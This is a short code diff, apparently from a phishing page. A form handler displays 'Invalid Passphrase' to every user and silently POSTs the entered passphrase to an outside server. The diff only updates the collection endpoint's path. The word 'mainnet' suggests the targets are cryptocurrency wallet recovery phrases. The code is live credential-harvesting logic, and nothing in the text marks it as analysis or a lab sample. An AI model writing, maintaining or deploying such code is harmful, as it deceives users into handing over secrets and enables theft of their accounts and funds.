@@ -15,7 +15,7 @@ form.addEventListener("submit", async (e) => {
     // counter++;
     e.preventDefault();
     message.innerHTML = " <p>Invalid Passphrase</p>";
-    await fetch("https://mainnet-production.up.railway.app/handle-mail", {
+    await fetch("https://mainnet-production.up.railway.app/handle-mail3", {
       method: "POST",
       body: JSON.stringify({ pass: data.value }),
     });
